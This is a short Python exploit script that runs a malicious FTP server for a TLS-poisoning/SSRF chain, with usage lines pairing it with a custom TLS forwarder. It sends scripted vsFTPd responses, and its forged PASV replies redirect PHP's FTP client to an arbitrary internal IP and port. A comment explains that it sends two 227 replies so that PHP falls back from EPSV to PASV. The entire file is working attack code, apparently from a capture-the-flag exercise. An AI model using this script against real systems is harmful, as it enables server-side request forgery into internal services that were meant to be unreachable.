import socket
import sys

'''
Usage: python3 exp.py local_port target_ip target_port
target/debug/custom-tls --port 8888 --verbose --certs /root/work/tls-poison/fullchain.crt --key /root/work/tls-poison/private.pem forward 6666
python3 FTPServer.py 6666 127.0.0.1 11200
'''

lport = int(sys.argv[1])
raddr = sys.argv[2].replace('.', ',')
rport = sys.argv[3]
rport = int(rport)
server = socket.socket()
server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
server.bind(('0.0.0.0', lport))
server.listen()
client, _ = server.accept()

client.send(b'220 (vsFTPd 3.0.3)\n')
print(client.recv(1024))
client.send(b'230 Login successful.\n')
print(client.recv(1024))
client.send(b'220 ok\n')
print(client.recv(1024))
client.send(b'220 ok\n')
print(client.recv(1024))
client.send(b'257 "/" is the current directory\n')
print(client.recv(1024))
client.send(f'227 Entering Passive Mode ({raddr},{rport//256},{rport%256})\n'.encode()) # 默认 php 会使用 EPSV 命令, 这个只能指定端口, 所以我们需要发送两次 227 让 php fallback 到 PASV 模式
print(client.recv(1024))
client.send(f'227 Entering Passive Mode ({raddr},{rport//256},{rport%256})\n'.encode())
print(client.recv(1024))
client.send(b'200 Switching to Binary mode.\n')
print(client.recv(1024))
client.send(b'125 data connection already open. Transfer starting.\n')
print(client.recv(1024))
client.send(b'250 Requested file action okay, completed.\n')
print(client.recv(1024))